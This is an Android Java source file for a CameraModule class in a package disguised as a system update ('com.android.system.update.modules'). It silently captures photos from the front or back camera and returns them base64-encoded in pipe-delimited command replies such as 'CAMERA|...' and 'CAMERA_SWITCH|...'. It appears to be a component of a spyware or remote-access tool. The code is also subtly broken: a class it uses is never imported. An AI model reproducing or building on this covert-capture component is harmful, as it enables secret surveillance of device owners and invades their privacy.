package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private static final int CAMERA_TIMEOUT_MS = 10000; // 10 seconds
    
    private Context context;
    private CameraManager cameraManager;
    private String currentCameraId;
    private String backCameraId;
    private String frontCameraId;
    private boolean isFrontCamera = false;
    private Handler mainHandler;
    
    public interface CameraCallback {
        void onPhotoTaken(String base64Image);
        void onError(String error);
    }
    
    public CameraModule(Context context) {
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        initCameras();
    }
    
    private void initCameras() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                for (String id : cameraManager.getCameraIdList()) {
                    CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                    if (facing != null) {
                        if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                            backCameraId = id;
                        } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                            frontCameraId = id;
                        }
                    }
                }
            } else {
                // For older Android versions, use Camera API
                int numberOfCameras = Camera.getNumberOfCameras();
                Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
                for (int i = 0; i < numberOfCameras; i++) {
                    Camera.getCameraInfo(i, cameraInfo);
                    if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                        backCameraId = String.valueOf(i);
                    } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        frontCameraId = String.valueOf(i);
                    }
                }
            }
            
            // Set default to back camera
            currentCameraId = backCameraId != null ? backCameraId : frontCameraId;
            Log.d(TAG, "Cameras initialized - Back: " + backCameraId + ", Front: " + frontCameraId);
            
        } catch (Exception e) {
            Log.e(TAG, "Error initializing cameras", e);
        }
    }
    
    public String switchCamera() {
        try {
            if (frontCameraId != null && backCameraId != null) {
                if (currentCameraId != null && currentCameraId.equals(backCameraId)) {
                    currentCameraId = frontCameraId;
                    isFrontCamera = true;
                    return "CAMERA_SWITCH|Front camera activated";
                } else {
                    currentCameraId = backCameraId;
                    isFrontCamera = false;
                    return "CAMERA_SWITCH|Back camera activated";
                }
            } else if (frontCameraId == null && backCameraId != null) {
                return "CAMERA_SWITCH|Only back camera available";
            } else if (backCameraId == null && frontCameraId != null) {
                return "CAMERA_SWITCH|Only front camera available";
            }
            return "CAMERA_SWITCH|No camera available";
        } catch (Exception e) {
            Log.e(TAG, "Error switching camera", e);
            return "CAMERA_SWITCH|Error: " + e.getMessage();
        }
    }
    
    public String getCurrentCameraInfo() {
        try {
            if (currentCameraId != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
                    Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                    String facing_str = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) 
                        ? "FRONT" : "BACK";
                    return "CAMERA_INFO|Current: " + facing_str;
                } else {
                    // For older Android, just return based on stored flag
                    return "CAMERA_INFO|Current: " + (isFrontCamera ? "FRONT" : "BACK");
                }
            }
            return "CAMERA_INFO|No camera selected";
        } catch (Exception e) {
            Log.e(TAG, "Error getting camera info", e);
            return "CAMERA_INFO|Error: " + e.getMessage();
        }
    }
    
    public void takePhoto(final CameraCallback callback) {
        if (!checkPermission()) {
            callback.onError("ERROR: No camera permission");
            return;
        }
        
        Log.d(TAG, "Taking photo with camera: " + (isFrontCamera ? "FRONT" : "BACK"));
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            takePhotoCamera2(callback);
        } else {
            takePhotoCamera1(callback);
        }
    }
    
    @SuppressWarnings("deprecation")
    private void takePhotoCamera1(final CameraCallback callback) {
        try {
            int cameraId = Integer.parseInt(currentCameraId);
            
            Camera camera = null;
            try {
                camera = Camera.open(cameraId);
                Camera.Parameters parameters = camera.getParameters();
                
                // Set photo quality
                parameters.setJpegQuality(95);
                
                // Set focus mode if supported
                if (parameters.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
                }
                
                camera.setParameters(parameters);
                camera.startPreview();
                
                final Semaphore captureSemaphore = new Semaphore(0);
                final AtomicReference<Exception> captureError = new AtomicReference<>();
                final AtomicReference<byte[]> imageData = new AtomicReference<>();
                
                camera.takePicture(null, null, new Camera.PictureCallback() {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        try {
                            Log.d(TAG, "Photo captured, size: " + data.length + " bytes");
                            imageData.set(data);
                        } catch (Exception e) {
                            Log.e(TAG, "Error processing photo", e);
                            captureError.set(e);
                        } finally {
                            if (camera != null) {
                                camera.stopPreview();
                                camera.release();
                            }
                            captureSemaphore.release();
                        }
                    }
                });
                
                // Wait for capture with timeout
                if (!captureSemaphore.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                    throw new Exception("Camera capture timed out");
                }
                
                if (captureError.get() != null) {
                    throw captureError.get();
                }
                
                byte[] data = imageData.get();
                if (data == null || data.length == 0) {
                    throw new Exception("No image data received");
                }
                
                String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
                mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
                
            } finally {
                if (camera != null) {
                    try {
                        camera.release();
                    } catch (Exception e) {
                        Log.e(TAG, "Error releasing camera", e);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Camera1 capture failed", e);
            mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
        }
    }
    
    private void takePhotoCamera2(final CameraCallback callback) {
        try {
            HandlerThread cameraThread = new HandlerThread("CameraThread");
            cameraThread.start();
            Handler cameraHandler = new Handler(cameraThread.getLooper());
            
            final Semaphore lock = new Semaphore(0);
            final AtomicReference<Exception> error = new AtomicReference<>();
            final AtomicReference<byte[]> imageData = new AtomicReference<>();
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        // Get camera characteristics for orientation
                        CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
                        Integer sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION);
                        
                        // Create ImageReader
                        ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
                        
                        reader.setOnImageAvailableListener(reader1 -> {
                            try (Image image = reader1.acquireLatestImage()) {
                                if (image != null) {
                                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                    byte[] bytes = new byte[buffer.remaining()];
                                    buffer.get(bytes);
                                    imageData.set(bytes);
                                    Log.d(TAG, "Photo captured, size: " + bytes.length + " bytes");
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error acquiring image", e);
                                error.set(e);
                            } finally {
                                camera.close();
                                lock.release();
                            }
                        }, cameraHandler);
                        
                        // Create capture request
                        camera.createCaptureSession(
                                Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        try {
                                            CaptureRequest.Builder builder = camera.createCaptureRequest(
                                                    CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            builder.addTarget(reader.getSurface());
                                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                            
                                            if (sensorOrientation != null) {
                                                builder.set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation);
                                            }
                                            
                                            session.capture(builder.build(), null, cameraHandler);
                                        } catch (CameraAccessException e) {
                                            Log.e(TAG, "Error capturing", e);
                                            error.set(e);
                                            camera.close();
                                            lock.release();
                                        }
                                    }
                                    
                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        error.set(new Exception("Session configuration failed"));
                                        camera.close();
                                        lock.release();
                                    }
                                }, cameraHandler);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error opening camera", e);
                        error.set(e);
                        camera.close();
                        lock.release();
                    }
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    error.set(new Exception("Camera disconnected"));
                    camera.close();
                    lock.release();
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int errorCode) {
                    error.set(new Exception("Camera error: " + errorCode));
                    camera.close();
                    lock.release();
                }
            }, cameraHandler);
            
            // Wait for capture to complete
            if (!lock.tryAcquire(CAMERA_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                throw new Exception("Camera operation timed out");
            }
            
            if (error.get() != null) {
                throw error.get();
            }
            
            byte[] data = imageData.get();
            if (data == null || data.length == 0) {
                throw new Exception("No image data received");
            }
            
            String base64Image = Base64.encodeToString(data, Base64.NO_WRAP);
            mainHandler.post(() -> callback.onPhotoTaken("CAMERA|data:image/jpeg;base64," + base64Image));
            
            cameraThread.quitSafely();
            
        } catch (Exception e) {
            Log.e(TAG, "Camera2 capture failed", e);
            mainHandler.post(() -> callback.onError("ERROR: " + e.getMessage()));
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    public void cleanup() {
        // Nothing specific to clean up since we release camera in each operation
    }
}
